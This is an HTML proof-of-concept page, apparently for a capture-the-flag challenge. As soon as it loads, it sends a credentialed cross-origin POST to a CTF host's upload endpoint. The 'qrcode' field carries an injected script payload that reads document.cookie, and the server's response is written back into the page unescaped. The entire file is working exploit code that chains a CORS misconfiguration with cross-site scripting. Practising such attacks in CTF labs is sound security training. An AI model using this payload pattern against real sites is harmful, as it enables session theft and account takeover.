<html>
  <!-- CORS PoC to Inject XSS Payload -->
  <body>
    <h2>CORS PoC</h2>
    <div id="demo"></div>
    <script>
      function corsRequest() {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://ctf.widyasecurity.com/upload", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.withCredentials = true;
        xhr.onreadystatechange = function() {
          if (this.readyState == 4 && this.status == 200) {
            document.getElementById("demo").innerHTML = this.responseText;
          }
        };
        
        // Vulnerable parameter with injected payload
        var payload = "qrcode=</script><script>alert(document.cookie)></script>";
        
        xhr.send(payload);
      }

      // Automatically submit the request on page load
      window.onload = corsRequest;
    </script>
  </body>
</html>
